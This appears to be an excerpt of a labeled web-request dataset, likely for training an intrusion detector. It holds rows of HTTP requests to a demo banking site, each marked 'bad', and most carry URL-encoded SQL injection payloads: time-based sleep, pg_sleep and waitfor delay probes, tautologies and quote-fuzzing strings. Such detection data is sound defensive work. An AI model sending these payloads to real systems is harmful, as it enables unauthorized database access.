364,POST,b'cfile=comments.txt&comments=1%22%20and%20sleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
365,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3dsleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,0,1,bad
366,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%2019-17%20%3d%20%272',2,0,0,0,4,0,bad
367,GET,b'',b'/swagger/index%27%3bselect%20pg_sleep%284%29%3b%20--%20.html',1,0,1,1,3,2,bad
368,GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%2745',4,0,0,0,2,0,bad
369,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
370,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%bf%27%bf%22',1,1,0,0,0,0,bad
371,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%27%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
372,GET,b'',b'/index.jsp?content=personal_loans.htm%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
373,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
374,POST,b'cfile=comments.txt&comments=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
375,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3dsleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,0,1,bad
376,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%2283',0,4,0,0,2,0,bad
377,GET,b'',b'/swagger/index%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',3,0,1,0,5,2,bad
378,POST,b'btnSubmit=Login&passw=acUn3t1x%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,1,1,2,6,2,bad
379,GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%270',4,0,0,0,2,0,bad
380,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
381,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%5c&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
382,GET,b'',b'/default.jsp?content=1%27%22',1,1,0,0,0,0,bad
383,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
384,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20and%20sleep%284%29%20',b'/doSubscribe',0,0,0,1,3,1,bad
385,POST,b'cfile=comments.txt&comments=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
386,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%220',0,4,0,0,2,0,bad
387,GET,b'',b'/swagger/index%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',2,1,1,0,5,2,bad
388,POST,b'btnSubmit=Login&passw=acUn3t1x%27%3dsleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,0,2,bad
389,GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%2296',0,4,0,0,2,0,bad
390,GET,b'',b'/',0,0,0,0,0,0,bad
391,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%c0%00xa7%c0%a2&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
392,GET,b'',b'/index.jsp?content=personal_loans.htm%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
393,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,0,1,2,6,1,bad
394,POST,b'cfile=comments.txt&comments=1%27%3dsleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
395,GET,b'',b'/',0,0,0,0,0,0,bad
396,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%2083-81%20%3d%20%222',0,2,0,0,4,0,bad
397,GET,b'',b'/default.jsp?content=%5c',0,0,0,0,0,0,bad
398,POST,b'btnSubmit=Login&passw=acUn3t1x%22%3dsleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,0,2,bad
399,GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%220',0,4,0,0,2,0,bad
400,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%40%40uooCt&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
401,POST,b'cfile=comments.txt&comments=1%22%3dsleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
402,GET,b'',b'/index.jsp?content=personal_loans.htm%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
403,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3bselect%20pg_sleep%284%29%3b%20--%20',b'/doSubscribe',1,0,1,1,3,2,bad
404,GET,b'',b'/',0,0,0,0,0,0,bad
405,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
406,GET,b'',b'/default.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
407,POST,b'btnSubmit=Login&passw=acUn3t1x%20and%20sleep%284%29%20&uid=1',b'/doLogin',0,0,0,1,3,2,bad
408,GET,b'',b'/default.jsp?content=security.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
409,GET,b'',b'/',0,0,0,0,0,0,bad
410,POST,b'cfile=comments.txt&comments=1%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,1,5,2,bad
411,GET,b'',b'/index.jsp?content=personal_loans.htm%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
412,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=JyI%3d&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
413,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',3,0,1,0,5,2,bad
414,GET,b'',b'/',0,0,0,0,0,0,bad
415,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
416,GET,b'',b'/default.jsp?content=%40%40Va505',0,0,0,0,0,0,bad
417,POST,b'btnSubmit=Login&passw=acUn3t1x%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,0,1,2,6,2,bad
418,GET,b'',b'/default.jsp?content=security.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
419,GET,b'',b'/',0,0,0,0,0,0,bad
420,POST,b'cfile=comments.txt&comments=1%27%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
421,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%bf%27%bf%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
422,GET,b'',b'/index.jsp?content=personal_loans.htm%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
423,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',2,1,1,0,5,2,bad
